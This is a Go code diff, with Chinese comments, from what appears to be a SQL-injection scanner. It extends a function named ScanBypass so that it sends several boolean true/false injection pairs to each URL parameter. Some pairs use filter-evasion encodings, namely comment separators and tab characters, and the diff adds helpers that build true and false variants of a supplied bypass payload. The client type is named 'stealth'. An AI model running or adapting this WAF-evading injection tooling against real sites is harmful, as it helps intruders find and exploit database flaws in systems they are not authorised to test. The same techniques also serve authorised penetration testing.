@@ -443,14 +443,29 @@ func ScanBypass(baseURL string, params []string, bypassPayload string, c *stealt
 	res := Result{Target: baseURL}
 	for _, param := range params {
 		f := Finding{Param: param, DBMS: "bypassed"}
-		// 布尔检测：穿透变体 AND true vs AND false
-		truePayload := bypassPayload // 已是绕过形式
-		falsePayload := strings.ReplaceAll(bypassPayload, "1=1", "1=2")
-		_, bTrue, _ := get(mutate(baseURL, param, truePayload), c)
-		_, bFalse, _ := get(mutate(baseURL, param, falsePayload), c)
-		if len(bTrue) != len(bFalse) {
-			f.Types = append(f.Types, "boolean")
-		} else if len(bTrue) > 0 && bTrue[:min(len(bTrue),128)] != bFalse[:min(len(bFalse),128)] {
+		// 布尔检测：多组真/假变体（覆盖所有绕过形式）
+		// 对 3 种布尔表达式分别测：1=1/1=2, AND/AND, 注释符形式
+		variants := [][2]string{
+			{bypassTrue(bypassPayload), bypassFalse(bypassPayload)},
+			{"1 AND 1=1", "1 AND 1=2"},
+			{"1/**/AND/**/1=1", "1/**/AND/**/1=2"},
+			{"1%09AND%091=1", "1%09AND%091=2"},
+		}
+		detected := false
+		for _, v := range variants {
+			_, bT, _ := get(mutate(baseURL, param, v[0]), c)
+			_, bF, _ := get(mutate(baseURL, param, v[1]), c)
+			if len(bT) != len(bF) {
+				detected = true
+				break
+			}
+			if len(bT) > 0 && len(bF) > 0 &&
+				bT[:min(len(bT),128)] != bF[:min(len(bF),128)] {
+				detected = true
+				break
+			}
+		}
+		if detected {
 			f.Types = append(f.Types, "boolean")
 		}
 		// UNION 检测
@@ -461,6 +476,24 @@ func ScanBypass(baseURL string, params []string, bypassPayload string, c *stealt
 		res.Findings = append(res.Findings, f)
 	}
 	return res
+}
+
+// bypassTrue/bypassFalse: 为绕过 payload 生成真/假布尔变体
+// 兼容注释符(/**/)、空白(%09)等绕过形式
+func bypassTrue(payload string) string {
+	// 若已含 1=1 保持，否则追加 AND 1=1（绕过风格）
+	if strings.Contains(payload, "1=1") {
+		return payload
+	}
+	return payload + " AND 1=1"
+}
+
+func bypassFalse(payload string) string {
+	// 若已含 1=1 改成 1=2，否则追加 AND 1=2
+	if strings.Contains(payload, "1=1") {
+		return strings.ReplaceAll(payload, "1=1", "1=2")
+	}
+	return payload + " AND 1=2"
 }
 
 // Format renders results.
